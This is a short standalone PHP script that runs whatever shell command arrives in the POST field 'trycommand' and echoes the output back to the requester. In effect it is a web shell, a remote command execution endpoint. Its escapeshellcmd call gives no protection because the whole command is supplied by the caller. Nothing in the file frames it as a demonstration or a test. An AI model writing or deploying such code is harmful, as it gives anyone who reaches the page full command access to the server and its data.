<?php
    $trycommand = $_POST['trycommand'];
    $command = escapeshellcmd($trycommand);
    $log = dirname($command) . '/trycommand.log';
    shell_exec($command . ' > ' . $log .' 2>&1');
    $output = shell_exec('cat ' . $log);
    echo $output;
?>